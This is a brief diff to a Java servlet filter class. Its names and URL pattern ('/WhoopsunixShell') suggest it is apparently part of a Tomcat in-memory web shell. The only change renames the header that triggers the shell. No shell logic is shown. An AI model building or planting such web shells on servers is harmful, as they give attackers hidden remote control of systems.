@@ -20,7 +20,7 @@ public class Tomcat6FilterThreadMS implements Filter {
 
     private static String NAME = "TomcatServletThreadMS";
     private static String pattern = "/WhoopsunixShell";
-    private static String header = "X-Token";
+    private static String header = "Xoken";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
